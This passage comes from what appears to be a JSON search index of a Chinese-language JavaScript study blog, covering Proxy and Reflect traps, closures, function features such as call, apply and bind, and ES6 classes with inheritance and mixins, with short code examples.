替换使用Reflect.has(Object, \"assign\"); // true\"assign\" in Object // true​\t在代理中简化使用Reflectconst handler = {    get() {        const someString = \"修饰返回值\"        return Reflect.get(...arg) + someString;    }}new Proxy(target, handler)const handler = {    get:Reflect.get;}new Proxy(target, handler)// 捕获所有方法，并转发给对应反射API的空代理，可以不定义Handler，直接使用Reflectnew Proxy(target, Reflect)this的问题  目标对象内部的this，指向Proxy代理          Proxy无法代理目标对象      通过this区分的内部函数，指向proxy后可能取不到      【使用目标对象调用自身属性方法】Reflect.get()        拦截函数的this，指向handler对象getget(target, propKey, receiver)  propKey — 属性名  receiver — 操作行为所针对的对象 [可选] （）  目标对象不存在的属性，访问时抛出指定的错误  数组读取负数的索引  读取属性返回函数，实现链式操作  生成各种DOM节点的通用函数 目标对象不存在的属性，访问时抛出指定的错误// 目标对象不存在的属性，访问时抛出指定的错误var person = {    name: '张三'}var proxy = new Proxy(person, {    get: function (target, propKey) {        if (propKey in target) {            return target[propKey]        } else {            throw new ReferenceError(`属性名${propKey}不存在`)        }    }})proxy.nameproxy.age数组读取负数的索引// 数组读取负数的索引function createArray(...elements){    let handle = {        get(target, propKey, recevier){            let index = Number(propKey);            if(index &lt; 0) propKey = String(target.length + index); // 倒序            return Reflect.get(target, propKey, recevier) // 结束代理处理，使用target原生处理函数        }    }    let target = [];    target.push(...elements);    return new Proxy(target, handle)}let arr = createArray('a','b','c','d','f');console.log(arr[-1]); // f读取属性返回函数，实现链式操作var pipe = function(value){var funcStacke = []; // 函数堆var oproxy = new Proxy({},{    get: function(pipObject, fnName){        /* 如果当前函数为get，则链式传递到最后一个函数，返回堆栈内函数的计算结果           否者，不为get，链式传递后面还有函数，将当前函数推入funcStrcke，返回Proxy，继续推入函数 */        if(fnName === 'get') {            /* reduce 中的每一项都递归传入，            指定val（第一个参数）为pipe的参数；fn是funcStacke的第二个函数，            返回计算的结果值 */            return funcStacke.reduce(function(val, fn){                return fn(val)            },value)}        funcStacke.push(window[fnName]); //        return oproxy;    \t}\t});    return oproxy;}var double = n =&gt; n*2;let number = pipe(2).double.get;// 1.pipObject = {}; fnName = double,  funcStacke = ['n =&gt; n*2']// 2.pipObject = {}; fnName = get;      console.log(number);生成各种DOM节点的通用函数// 1. target:obj -- property:p -- attrs:href: '//example.com' -- children: ['Mark']// 2. target:obj -- property:a -- attrs:{} -- children:['The web']// 3. target:obj -- property:ul - attrs:{} -- children:['Food']// 4. target:obj -- property:li - attrs:{} -- children:[\"…actually that's it\"] // 5. target:obj -- property:li - attrs:{} -- children:[li, li, li]    // 6. target:obj -- property:li - attrs:{} -- children:['Hello, my name is ', a, '. I like:', ul] const dom = new Proxy({}, {    get(target, property) {        return function (attrs = {}, ...children) {            const el = document.createElement(property); // 传入的属性值创建节点            for (let prop of Object.keys(attrs)) {                el.setAttribute(prop, attrs[prop]); // 节点添加属性            }            for (let child of children) {                 if (typeof child === 'string') { // 孩子节点是字符串，添加节点文字                    child = document.createTextNode(child);                }                el.appendChild(child); // 父节点添加孩子            }            return el;        }    }});const el = dom.p({},                 'Hello, my name is ',                 dom.a({ href: '//example.com' }, 'Mark'),                 '. I like:',                 dom.ul({},                        dom.li({}, 'The web'),                        dom.li({}, 'Food'),                        dom.li({}, '…actually that\\'s it')                       )                );document.body.appendChild(el);set​\tset(target, propKey, propValue, receiver)  propKey — 属性名  propValue — 属性值  数据验证 — 不符合要求的设定值，抛出异常  数据绑定 — 当对象发送变化是，自动更新DOM  结合set、get，实现属性名第一个字符使用下划线，不允许外部使用数据验证 — 不符合要求的设定值，抛出异常let validator = {    set: function (obj, prop, value) {        if (prop === 'age') {            if (!Number.isInteger(value)) {                throw new TypeError('The age is not an integer');            }            if (value &gt; 200) {                throw new RangeError('The age seems invalid');            }        }        // 对于满足条件的 age 属性以及其他属性，直接保存        obj[prop] = value;        return true;    }};let person = new Proxy({}, validator);person.age = 100;person.age = 'young' // 报错person.age = 300 // 报错数据绑定 — 当对象发送变化是，自动更新DOM&lt;body&gt;    &lt;input type=\"text\" id=\"model\"&gt;    &lt;p id=\"words\"&gt;222&lt;/p&gt;&lt;/body&gt;const model = document.getElementById(\"model\");const words = document.getElementById(\"words\");const proxy = new Proxy({}, {    get(target, propKey, receiver) {        return Reflect.get(target, propKey, receiver)    },    set(target, propKey, propValue, receiver) {        if (propKey === 'key') { // 修改的属性名是key，则修改对应的值            model.value = propValue;            words.innerHTML = propValue        }        return Reflect.set(target, propKey, propValue, receiver)    }})// 给输入框添加点击事件model.addEventListener('keyup', (e) =&gt; {    proxy.key = e.target.value;})结合set、get，实现属性名第一个字符使用下划线，不允许外部使用const handler = {    get(target, key) {        invariant(key, 'get');        return target[key];    },    set(target, key, value) {        invariant(key, 'set');        target[key] = value;        return true;    }};function invariant(key, action) {    if (key[0] === '_') {        throw new Error(`Invalid attempt to ${action} private \"${key}\" property`);    }}const target = {};const proxy = new Proxy(target, handler);proxy._prop// Error: Invalid attempt to get private \"_prop\" propertyproxy._prop = 'c'  // Error: Invalid attempt to set private \"_prop\" propertyapply(target, this, args)​\tapply(target, this, args){}      this，目标对象的上下文        args，目标对象参数数组    拦截函数 — call、apply — 触发调用  has (target， key)  key ，需要查询的属性名  拦截 HasProperty()          has() 不判断一个属性是对象自身的，还是继承的      只对 in运算符生效，而不对for... in生效      construct (target, args, newTarget)  newTarget， 创建实例对象，new命令作用的构造函数  :warning: target必须是函数  :warning: 返回的必须是对象存在问题目标对象方法依赖于调用对象标识const wm = new WeakMap() // 类外部定义，所有实例共享一个 WeakMapclass User{    constructor(id){        wm.set(this,id)    }    get id(id) return wm.get(this);    set id(newid) \twm.set(this,id)    // ... get() set()}const user = new User(123);const userProxy = new Proxy(user,{}); // wm: {user {}: 123}wm.get(User)\t// undefineduser.id \t\t// 相当于 wm.get(user), 返回 123userProxy.id \t// 相当于 wm.get(userProxy), 返回 undefined​\twm.get(this) 方法依赖于调用的对象，暴露了this指向问题，使得返回值不正确；把代理User实例改为代理User类本身，再创建代理实例，就会以代理实例作为WeakMap的键了。const UserClassProxy = new Proxy(User,{});const proxyUser = new UserClassProxy(456);const proxyUser2 = new UserClassProxy(789)// wm: WeakMap {User =&gt; 456, User =&gt; 789}wm.get(User) // undefineduser \t// undefined 类没有创建实例，而是直接使用类代理，创建代理的实例proxyUser.id // 456proxyUser2.id // 789代理与内部槽位​\t当ECMAScript内置类型可能会依赖某些代理无法控制（访问器无法访问到的方法）的机制，会导致使用代理调用时出现问题。​\t例如Date 类型方法的指向依赖this值上的内部槽位[[NumberDate]]，值不能通过普通的get()和set()操作访问到，且代理对象不存在这个内部槽位。于是代理拦截后本应该转发给目标对象的方法，会抛出异常 TyperError。const target = new Date();const proxy = new Proxy(target, {});proxy instanceof Date; // trueproxy.getDate(); // 'this' is not a Date object;"
  },
  
  {
    "title": "8. 闭包",
    "url": "/posts/8.%E9%97%AD%E5%8C%85/",
    "categories": "JavaScript, 闭包",
    "tags": "javascriptBase",
    "date": "2022-08-29 00:00:00 +0800",
    





    
    "snippet": "闭包作用域  在执行上下文中，存在两种变量：  变量对象（全局变量）：全局上下文，在代码执行期间始终存在，保存在scope-script里  活动对象（局部变量）：执行上下文，只在函数执行期间存在  生成的时机：  在定义函数时，会为它创建作用域链，申请空间，预装载全局变量，并保存在内部的[[scope]]中。  预编译不会执行函数里面的内容  在调用函数时，创建相应的执行上下文，并通过复制...",
    "content": "闭包作用域  在执行上下文中，存在两种变量：  变量对象（全局变量）：全局上下文，在代码执行期间始终存在，保存在scope-script里  活动对象（局部变量）：执行上下文，只在函数执行期间存在  生成的时机：  在定义函数时，会为它创建作用域链，申请空间，预装载全局变量，并保存在内部的[[scope]]中。  预编译不会执行函数里面的内容  在调用函数时，创建相应的执行上下文，并通过复制函数的[[scope]]创建其作用域链；并创建函数的活动对象，推入作用域链的前端。​\t作用域链：包含指针的列表，执行每一个变量对象；标识所在位置越深，读写速度就会越慢（全局总是在最末端）​\t在一个函数内部定义的函数，会把其包含函数的活动对象（所有外部的局部变量）添加到自己作用域链中​\t多次调用同一个函数，占用不同的空间，多个内存地址，之间的数据不会共享函数生命周期延长      普通函数创建实例    return 内部函数（引用类型）给外部使用let a = func()。只要外部使用不停止，函数就不会被回收    外部变量a重复调用时，函数变量内部变量值不变，在原有的基础上继续进行处理；而不是重新开始    使用另一个外部变量调用函数，又会重新在内存空间开辟新地址，所有变量初始化（函数调用开辟新开机）；此变量之后的重复使用，在原有的基础上继续处理（变量保存函数空间的地址）        构造函数，默认返回引用；每个实例一个内存空间  什么是闭包闭包（Closure）：指一个函数可以访问到其外层函数中的数据（作用域）—— 闭包是函数作用：  延长变量的生命周期：全局变量不会被回收  创建私有变量空间：私有变量不会污染全局弊端：闭包会保留包含它们函数的作用域，比其他函数更占用内存暴露一个访问器，返回出去的变量可通过该函数间接范围；在javascript语言中，内层函数可以访问到外层函数的数据（即使外层函数不再存在引用），即为闭包​\t内部函数永远不能直接访问到外部函数 this 和 arguments 这两个变量。箭头函数中的this非严格模式下执行window；严格模式下值为undefined。想要访问，可以使用 变量存this，将其引用保存到闭包能够访问得到的变量中。window.getIdentity = \"the window\"let object = {    identity : \"the object\",    getIdentity(){        return function(){            this.identity;  // \"the window\" 内部函数无法访问外部函数的this，内部this不存在这个变量往全局找        }    }}let object = {    identity : \"the object\",    getIdentity(){        let that = this;        return function(){            that.identity;  // that 是外部函数变量，闭包可以访问到        }    }}​\t对象内部使用了thislet object = {    identity : \"the object\",    getIdentity(){        return this.identity;  // 对象方法内部直接使用this    }}object.getIdentity(); // “the object\"(object.getIdentity = object.getIdentity)(); // the window// 执行了一次赋值，然后再调用赋值后的结果；表达式的值是函数本身(getIdentity())，this值不再于任何对象绑定，返回全局变量内存泄漏​\t闭包一直持有可能已经销毁的外部变量，可能导致内存泄漏。匿名闭包将可能难以清除。function assignHandler(){\tlet ele = document.getElementById(\"elementId\");    ele.onclick = () =&gt; { console.log(ele.id); }}​\t内部函数形成了一个闭包，这个匿名函数一直持有着 assignHandler 中的活动对象，即DOM元素的引用。只有匿名函数存在，ele的引用数就至少为1，内存永远不会被回收。function assignHandler(){\tlet ele = document.getElementById(\"elementId\");    let id = ele.id    ele.onclick = () =&gt; { console.log(id); }    el}​\t:one: 消除循环使用，只保存外部函数变量，而不是外部函数获取到的其他元素​\t:two: 闭包会引用外部函数的活动对象，其中仍然包含DOM元素的引用，所以需要把外部引用设置为null​\t至此，闭包与外部函数获取的其他元素无关。"
  },
  
  {
    "title": "7. 函数",
    "url": "/posts/7.%E5%87%BD%E6%95%B0/",
    "categories": "JavaScript, Object",
    "tags": "javascriptBase",
    "date": "2022-08-26 00:00:00 +0800",
    





    
    "snippet": "​\t函数存在提升的问题，优先级比变量优先级高定义      函数表达式  — let fun = function() {}        构造函数 ——  new Function() {}          参数必须是字符串格式      所有函数都是Function的实例、也是对象（引用类型）      new Function(“参数1”,”参数2”,”函数体”) ，最后一个参数作为...",
    "content": "​\t函数存在提升的问题，优先级比变量优先级高定义      函数表达式  — let fun = function() {}        构造函数 ——  new Function() {}          参数必须是字符串格式      所有函数都是Function的实例、也是对象（引用类型）      new Function(“参数1”,”参数2”,”函数体”) ，最后一个参数作为函数体      函数会被解析两次：        解析器率先读取 函数声明，使其在执行任何代码前就可以被访问；而 函数表达式 必须等解析器执行到其所在的代码行，才被真正解释        箭头函数  ​\t函数声明提升：使用函数声明，会在任何代码执行之前先读取并添加到执行上下文中。​\t函数表达式相当于位于变量声明中，如果是const、let变量，则不存在变量/函数声明提升问题；var变量，则面临与函数声明一样的提升问题。函数特性函数名  使用不带括号的 函数名name，表示指针；带括号使用 函数名name()，表示调用  函数对象都会暴露一个只读的 `name`属性 ，包含关于函数的信息          (new Function()).name 构造函数创建的匿名函数，值为anonymous      (()=&gt;{}).name 匿名函数，值为空字符串\"\"      函数是一个 get set 或者 bind()实例化，标识符会存在一个前缀        一个对象引用（可改变指向，多个函数名可能指向同一个函数）参数​\t函数的参数在内部表现为一个数组，（非箭头函数）定义函数时，可以在内部使用arguments对象访问传入的参数值。  arguments — 类数组对象      始终与对应的命名参数同步，但与参数存放在不同的内存空间中。        数组：包含传入（非定义时）函数的所有参数，可以用arguments.lenght确定实参个数    - 对象：具有callee（指针）属性，指向这个arguments对象的函数，arguments.callee.lenght 确定形参的个数  ​\t在递归回调函数中，回调中写 自身函数名，若修改函数名，则会出现问题；改成arguments.callee，适用于 匿名函数和递归调用时。​\t在严格模式下，:one: 对arguments[0]赋值，不会影响参数； :two: 在函数中重写arguments对象会导致语法错误。  重载：JavaScript不存在验证命名参数的机制，两个同名函数会覆盖先定义的，但可以使用lenght 根据传入参数的数量，实现重载function hello(name,message)(\tif(arguments.length) return 'no one come in'\tif(arguments.length === 1) return \"this gus didn't say anything\"\tif(arguments.lenght === 2) return arguments[1])  函数名解耦function factorial(num){    if(num &lt; 10) return 1    return num * factorial(num - 1)}let a = factorial(10); // 3628800// 为函数体保存多个函数名，并将 factorial 函数名（指针）指向为空let newLocal = factorial;factorial = null;// 再次调用 函数体，内部的factorial() = null，导致计算失败let b = factorial(10); // factorial is not a function​\t可以使用arguments.callee： 指向arguments对象所在函数的指针function factorial(num){    if(num &lt; 10) return 1    return num * arguments.callee(num - 1)}  默认参数值（ES6）arguments不反映默认值，只反映传给函数的参数；修改命名参数不会影响arguments对象，以调用函数时传入的值为准。只有在函数被调用时、未传入相应参数时，默认参数值才会被求值；作用域：位于函数存活时间内，块级作用域，且参数按定义的先后顺序初始化function makeK (name = \"King\"){}function makek (name = \"King\", time = getTime(name)){}      caller属性（非标准的）    调用当前函数的引用，如果是全局调用则为null。    在严格模式下，访问arguments.calleer会报错，且不可以给函数的caller`属性赋值，否则会导致错误  作为值​\t调用函数对象（数组）决定操作的对象，function createComparisonFunction(propertyName){ \t// 外层参数`propertyName` 指定操作的属性值    return function(object1, object2){        let value1 = object1[properyName];        let value2 = object2[properyName];                        // 对 value1 &amp; value2 操作 \t\t\t\t\t内层函数决定操作内容。    }}let arr = [    {name:\"zhang\",age:18},    {name:\"cheng\",age:20}]arr.sort(createComparisonFunction(age));\t// obj.sort 遍历调用数组内部的值this指向1. 普通函数：   - 定义 `function fn() {}`   - 调用 `fn();`   `fn.call()`   - **this → window**2. 构造函数   - 定义：`function Star() {}`   - 调用： `new Star();`   - **this → 实例对象**，原型对象里面的方法也是3. 对象的方法   - 定义： `let o = { sayHi: function() {} }`   - 调用：`o.sayHi();`   - **this → 方法所属的对象**4. 绑定事件函数   - `btn.onclick = function() {};`   - **this → 绑定事件的对象**5. 定时器函数   - window.`setInterval( function() {}, 1000)`  —— 每隔1s自动调用一次   - this → window6. 立即执行函数   - `( function() {} )(传入参数)`   - this → window7. 箭头函数   - 定义：`let fn = ()=&gt;{}`   - **this → 保留定义时的this**案例：新增数组方法操作变量存this​\t声明时，function User(name){this.name = name}为空对象User{}；被调用时，根据参数生成User{name:\"参数\"}​\t所以this是可以被改变的let Lesson = {\tsite:\"122\",    lists: [\"js\",\"css\",\"mysql\"],    show: function() {        const self = this; //指向对象        return this.lists.map(function(value){            console.log(this); //指向window            console.log(value);//形参            console.log(this.site);//指向window，undefined            console.log(self.site);//指向对象，”122\"        })    }部分函数存在第二参数可传递thisshow: function(){\treturn this.lists.map(function(){    \tconsole.log(this); //对象    },this);  }new.target​\t检测函数是否使用了new关键字调用。​\t如果函数是正常调用，new.target = undefined；如果使用new关键字调用，new.target指向被调用的 构造函数。call &amp; apply​\t以指定的this调用一个函数，返回函数的返回值；更换函数调用的作用域；​\t传入的数组内元素的个数 &gt; 函数可以接受的参数，数组内多余的将被丢弃；​\t非严格模式下，调用时没有指定this，this = window；​\t在严格模式下，调用时没有指定this，不会指向window而是会变成undefined。function fun(value1,value2,value3...)// call (this, 参数) 参数间使用逗号分隔function callFun(value1, value2, value3 ...){    return fun.call(this, value1, value2, value3)}// apply (this, 参数数组)function applyFun(value1, value2, value3 ...){    return fun.apply(this, arguments); // 传入数组、类数组    return fun.apply(this, [value1, value2, value3])}​\tcall &amp; apply 区别在与第二个参数是否为数组；如何选用完全取决于怎么调用函数传参方便：​\tapply()数组参数传入函数内部直接展开；call()仍以数组形式传入；如果不需要参数，两者都一样。应用1：避免求值遍历​\tMath.max.apply(null, arr); === Math.max(...arr);应用2：call和apply方法实现封装接口bind()​\t调用bind后此函数后不会立即执行，而是得到一个新的函数、实例（不同内存地址）​\tshow.bind({name: \"\"})()可使其立即执行​\t传递参数的方法：（不是立即执行）​\t绑定时传参（已将全部参数赋值，调用时传参无效）​\t调用时传参（参数填充完，剩余参数无用）// 不调用函数，但改变this的指向原函数的拷贝 = fun.bind( 指定的this, value1，value2 ...){}      主要应用：                  偏函数，使绑定的函数拥有预设的初始参数（包括this值，预设的参数），调用时传递的参数会跟在它们后面            快捷调用      配合定时器      let o = { name: 'baby' } // 调用的对象function fn(arr1,arr2,arr3) {    console.log(this.name);  // baby    console.log(arr1,arr2,arr3);}let bindFun = fn.bind(o,1,3); // arr1 = 1，arr2 = 2， arr3 = undefined ，this指向o， 但没有调用bindFun(0); // arr3 = 0let btn = document.querSelector('button');btn.onclick = function() {    this.disabled = true;  // 函数内的this指向调用者    // bind 解决    setTimeout( function(){        // this.disabled = false;     定时器内的this指向window，没有这个属性    }.bind(this),3000) //为定时器的函数外面（此时的this仍然时函数的调用者）绑定this，之后内部的this指向函数的调用者    // 箭头函数 解决    setTimeout= ()=&gt;{        this.disabled = false;     //箭头函数没有自己的this，这个this指向上一级调用者    },3000)}递归函数​\t定义：函数内部调用自己​\t栈溢出（stack overflow），死循环 —— 退出条件非常重要      解决问题 —— 递归函数案例                  求1-n的阶乘        函数内部使用了 函数名调用，导致执行逻辑与函数名耦合，应该替换为arguments.callee()              function fn(n) {    if (n == 1) { return 1; }    if (n &gt;= 0) {         return n * fn(n - 1);         // return n * arguments.callee(n - 1)    }    else        alert(\"请输入大于等于1的数\");}console.log(fn(-3));                      求斐波那契数列  $a_n = a_{n-1} + a_{n-2}(a_1 = 1,a_2 = 1,n≥3)$        尾调用优化：如果函数逻辑允许基于尾调用将其销毁，则引擎会这么做（ES6特性）              function fb(n) {    console.log(n);    if (n === 1 || n === 2) { return 1; }    else         return fb(n - 1) + fb(n - 2);}console.log(fb(3));  // 优化后：function fib(n){\treturn fibImpl(0, 1, n);}function fibImpl(a, b, n){    if(n === 0) return a;    return fibImpl(b, a+b, n-1);}      尾调用优化的条件：  代码在严格条件下 —— 非严格模式下函数调用中允许使用f.arguments 和 f.caller，都会引用外部函数的堆栈  外部函数（fib）的返回值是对尾调用函数（fibImpl）的调用  —— 上下文不再返回外部函数（fib）中  尾调用函数（fibImpl）返回后不需要执行额外的操作 —— 上下文不再返回外部函数（fib）中  尾调函数（fibImpl）不是引用外部函数作用域中自由变量的闭包 —— 外部函数（fib）上下文仍有存在的必要全局函数function screenX(){}默认压入window中，可能覆盖window中声明的属性/变量，函数提升的问题将函数赋值给let变量可以避免以上问题函数用类的方法声明（es6）class a {}⁉️高阶函数  对其他函数进行操作（满足其中一个）          接受函数作为参数      将函数作为返回值输出      // 接受函数作为参数function fn(callback){ callback &amp;&amp; callback(); }fn(function() { alert('hi'); })// 将函数作为返回值输出function fn(){ return function() {} }// 回调函数立即执行函数 （IIFE）​\tImmediately Invoked Function Expression，在ES5尚未支持块级作用域，用来模拟块级作用域（作用域仅为括号内，执行完毕作用域链销毁）(function( 形参 ){    // 在函数作用域内，使变量活动块级作用域})( 实参 )      链式引用script若有同名函数，取最后引入加载的script函数        使用模块化类的方式  传入参数window(function(window){    function hd(){}    window.js2 = {hd} //对外开放一个接口})(window);js2.hd块作用域解决{\tlet hd = function(){}    window.js1 = {hd};}### ⁉️箭头函数（Es6）const hd = ( 形参 ) =&gt; { 函数体 };let hd = [1,2,3].filter(value =&gt; value &lt;= 3);const sum = (num1,num2) =&gt; num1 + num2;\t// 函数体 只有代码，可以省略大括号；返回值为执行结果console.log( sum(10,20) ); // 30const fn = v =&gt; alert(v); //形参 只有一个，可以省略小括号fn(20);  递归 、构造、事件处理器不适用箭头函数  没有 arguments（只能通过定义的参数名访问）、 super、 new.target 属性，也没有 prototype 属性  无具体参数名称，回调不方便、箭头函数，this指向上一级的this，没有自己的this  函数定义时作用域就有了，this需具体到执行时，箭头函数在绑定时决定var obj = {    age: 40,    say: () =&gt; { alert(this.age) }  // 实际上是定义在window下的方法}obj.say(); // undefind// obj是一个对象，对象不产生作用域；作为window调用，返回undefined取对象同时取DOM节点  取对象：箭头函数；取节点：普通函数，不可同时实现解决方法：  button.addEventListener(\"click\",function(event){})中的event.target指当前绑定的按钮let Dom = {    site: '',    bind: functon(){\t\tconst button = document.querySelector(\"button\");button.addEventListener(\"click\",event =&gt; {\tconsole.log(this); //箭头函数指父级对象    console.log(event.target);//获取当前绑定的DOM节点        })\t}}  const self = this；  hanleEvent  element.addEventListener(type, listener[, useCapture]);其中listener：当指定的事件类型发生时被通知到的一个对象。该参数必须是实现EventListener接口的一个对象或函数。即，第二个参数除了可以传入函数外，还可以传入对象。  事件会自动在传入对象中寻找handleEvent方法let Dom = {    handleEvent: function(event){            },    bind: funcion(){    \tconst button = document.querySelector(\"button\");\t\tbutton.addEventListener(\"click\",this); //传入当前对象，自动寻找handleEvent方法\t}}访问私有变量​\t任何定义在函数或块中的变量，都可以认为是私有的，因为在这个函数/块的外部无法访问其中的变量。特权方法​\t其实就是使用 闭包 的原理，具有访问构造函数中定义的所有变量和函数的能力。function Person(value){    // 私有变量    let name = value    // 特权方法    this.getName = function(){ return name; }    this.setName = function(value) { name = value; }}let person = new Person('lisi');person.getName(); // 'lisi'静态私有变量​\t私有作用域内定义公用的构造函数，并在构造函数原型上添加特权方法实现访问私有变量。但这个私有变量是“共享”的.​\t在下面例子中，构造函数使用函数表达式而不是函数声明，函数声明会创建内部函数，这里不是必须的。function (){    // 私有变量     let privateVariable = 10;    // 私有函数    function privateFunction (){        return false;    }    //  构造函数    // 1. 不带关键字的，全局变量    // 2. 表达式声明，执行时才会创建函数    MyObject = function() {}    // 在构造函数的原型上添加特权方法    MyObject.prototype.publicMethod = function (){        return privateFunction();    }}模块模式​\t单例对象(singleton)：只有一个实例的对象，通常通过 对象字面量 创建。​\t模块模式是在单例对象基础上加以扩展，通过作用域链关联私有变量和特权方法。let singleton = function() {    // 私有变量     let privateVariable = 10;    // 私有函数    function privateFunction (){        return false;    }    // 特权、公有方法和属性    return { // 返回对象字面量        publicProperty: true,        publicMethod(){            return privateFunction();        }    }    }​\t函数返回的对象字面量，只包含可以公开访问的属性和方法；因为其定义在匿名函数的内部，所以可以访问同一个作用域的私有变量和私有函数。​\t对象字面量 本质上定义了 单例对象的公共接口。如果单例对象需要进行初始化，且需要访问私有变量，可以使用。模块增强模式​\t在返回对象之前，对其进行增强。适用于：单例对象需要某个特定类型的实例，但又需要给它添加额外属性、方法let application = function(){    let components = new Arrya();    // 指定某种特定的类型    components.push(new BaseComponent());        // 创建局部变量，保存额外功能的实例    let app = new BaseComponent();    // 获取私有变量的属性    app.getCompontCount = function(){        return components.length;    }    // 设置私有变量    app.setCompontRegister = function(components){        return components.push(component)    }    return app; // 返回实例}​\tapplication返回值是app实例，可以让components被外部访问到"
  },
  
  {
    "title": "6. 类",
    "url": "/posts/6.%E7%B1%BB/",
    "categories": "JavaScript, Object, 原型链",
    "tags": "javascriptBase",
    "date": "2022-08-25 00:00:00 +0800",
    





    
    "snippet": "  声明：class name(){ }；实例：new name( )// 类声明class Person {}// 类表达式const Animal = class AnimalClass {};// 接收类的变量名称可以改变，之后可以通过 Aniaml.name 属性获取类名称字符串；但不能单独使用类名称字符串访问类Animal.name // AnimalClassAnimalClas...",
    "content": "  声明：class name(){ }；实例：new name( )// 类声明class Person {}// 类表达式const Animal = class AnimalClass {};// 接收类的变量名称可以改变，之后可以通过 Aniaml.name 属性获取类名称字符串；但不能单独使用类名称字符串访问类Animal.name // AnimalClassAnimalClass // undefined​\t类表达式Animal，在它们求值之前不能被引用，且不能被提升。  作用域： 块级作用域 限制类的构成类方法​\t类方法等同于对象属性，其键可以是 字符串、符号、或是计算后的值class Person(){ // 类名首字母大写；类中的方法， 不需要function；方法之间不需要, 隔开    // 构造方法\tconstruct(uname){        // 实例成员\t\tthis.name = uname; // 自动添加了属性\t}    // 实例方法\tsing(song) {\t\tconsole.log(this.name + song);\t}    // 静态方法：每个类上只有一个，this引用自身；适合用作实例工程    static shareWithSub() {}    // 获取函数    get myName {}    // 设置函数    set myName(newName) {}}成员数据​\t把方法定义在类构造函数、类块中，但不能在类块中给原型添加原始值、对象作为成员数据。给原型定义成员数据：Person.prototype.greeting = 'my name is'Person.name = 'Jack'console.log(`${Person.prototype.greeting} ${this.name}`)迭代器 &amp; 生成器class Person {    *createNameIterator(){ // 原型上定义迭代器\t\tyield 'Jack';\t\tyield 'Mack';\t\tyield 'Anry';            }    static *createTimeIterator(){ // 类上定义迭代器\t\tyield '220101';\t\tyield '220102';\t\tyield '220103';            }}const timeIterator = Person.createTimeIteratortimeIterator.next().value //220101timeIterator.next().value //220102let p = new Person();const nameIterator = p.createNameIterator()nameIterator.next().value //JacknameIterator.next().value //Mack​\t添加一个默认迭代器，把类实例变成可迭代对象class Person() {    constructor(){        this.name = ['Jack','Mack','Anry']    }\t*[Symbol.iterator]() { // 返回迭代器，不直接执行内部指令        yield *this.name.entries();    }    [Symbol.iterator]() { // 返回元素地址，键值对        yield *this.name.entries();    }}class Star {    constructor( name, age ){        this.btn = document.querySelector('button');        this.btn.onclick = this.sing; \t// 当点击时，调用sing函数，        this.btn.onclick = this.sing(); // 立即执行sing函数，undefined       \t/**        个人理解：this.sing 传入了函数所在的地址，点击时查找到函数再调用；this指向调用者                this.sing() 是函数调用语句，返回的结果赋值给按钮；this指向构造者        */    }}实例化​\t类必须使用new实例化对象。解释器在使用new操作符创建类时，需要调用constructor关键字定义的函数。不定义构造函数，相当于使用空函数。使用new操作符时，执行四个步骤。​\t类实例化时传入的参数，会作为构造函数的参数。默认情况下，返回构造函数创建的对象；如果修改默认返回值，而是其他对象，这个结果将不会被instanceOf检测出跟类有任何关系。class Person{    constructor(){        return {}    }}let p1 = new Person(); // {}​\t类的构造函数，除了必须使用new操作符调用，在类实例化完成后，就成为了一个普通的实例方法。​\t普通构造函数不使用new调用，以全局的this（通常是window）作为内部对象let p1 = new Person(); // {} p1 instanceof Person  // truelet p2 = new Person.constructor(); // 使用构造函数引用构造一个新实例p2 instanceof Performance //falsep1 == p2 // false​\t类中定义的constructor()不会被当作构造函数​\t类的本质是一个特殊的函数。类标识符有prototype属性，这个原型中的constructor属性指向类自身。 类中定义的constructor()不会被当作构造函数​\t（实例只保留指向原型的指针[[prototype]]，没有指向构造函数的指针）typeof Person // function// Person 被认为是构造函数Person === Person.prototype.constructor // true用法作为参数let classList = [    class {        constructor(id){            this.id = id;            console.log(`instance ${this.id}`)        }    }]function createInstance(classDefinition, id){    return new classDefinition(id)}let foo = createInstance(classList[0],1); // 批量生成类 foo = classList {id: 1}立即实例化new class Foo { \tconstructor(id){        this.id = id;        console.log(`instance ${this.id}`)    }    }(1)继承class Father {    constructor (x, y) { // 1.父类生成实例时，父类的x、y被赋值        this.x = x;        this.y = y;    }    sum() {    \tconsole.log(this.x + this.y); // 2.这里this指向父类的x、y    }}class Son extends Father {    constructor (x, y) {        // 4. 此处应该调用父类对构造方法：super(x, y);        this.x = x;        this.y = y;    }}let son = new Son(1, 2); // 3.生成是子类，父类构造函数未调用，父类的x、y还是undefined，不能计算son.sum(); // 报错！  extends 可以在类表达式中使用： const son  = new Son extends Father  this 谁调用指向谁  super关键字：调用父类的函数（构造函数、静态函数）          只能在派生类的构造函数、静态函数中调用                  在构造函数中使用super()，表示直接调用父类构造函数super.constructor()，需要手动传入          静态函数中使用super，可以调用继承类的静态方法。                    会返回父类的this，所以【! super必须在子类this之前】        call方法： 在子构造函数中，使用Father.call(this)​\t派生类中显示定义了构造函数，要么🔖返回调用super返回父类 ，要么🏷️返回一个对象class Son extends Father(){    constructor(){        super();    }}class Son extends Father(){    constructor(){        return {};    }}抽象基类​\t可以给其他类继承，但本身不能实例化；使用new.target识别当前实例化的类型，从而决定要不要对其进行实例化class Vehicle{    constructor() {\t\tconsole.log(new.target);        // 识别当前实例化的类型        if(new.target === Vehicle) throw new Error(\"Vehicle can't be directly instantiated\")        // ..                // 必须实现某个方法        if(!this.foo) throw new Error(\"Inheriting class must define foo{}\");    }}new class Bus extends Vehicle {    foo() {}}new class Bus extends Vehicle {} // Error：Inheriting class must define foo{}new class Vehicle {} // Error：Vehicle can't be directly instantiatedspecies访问器​\t返回实例类型，其被构造函数用以创建派生对象。getter默认返回this，未部署setter属性；默认情况下，返回原始实例类型一致。​\t如果需要覆盖这个行为，可以在子类的构造函数内声明为静态方法，或者用 Object.defineProperty 等方法添加或修改此属性。class MyArray extends Array {  // 覆盖 species 到父级的 Array 构造函数上  static get [Symbol.species]() {    return Array;  }}const myArray = new MyArray();myArray instanceof MyArray; // falsemyArray instanceof Array;   // true类混入​\t把不同类行为集中到一个类中。:one: Object.assign()：将多个对象属性混入:two: extend关键字后接表达式class Vehice {}function getParentClass () {    console.log('get superClass1')    return Vehice;}class Bus extends getParentClass(); // Bus extends Vehice// 多重继承: 接受一个超类做为参数，将混入类定义为这个参数的子类let doorMixin = (SuperClass) =&gt; class extends SuperClass{    door() { console.log(\"add car door\") }}let glassMixin = (SuperClass) =&gt; class extends SuperClass{    glass() { console.log(\"add car glass\") }}// class Bus extends doorMixin(glassMixin(Vehice)){}let bus = new Bus();// 借助辅助函数，展开嵌套调用function mixin(BaseClass, ...Mixins){ // Aarry.reduce 累加遍历；accumulator 累加器\treturn 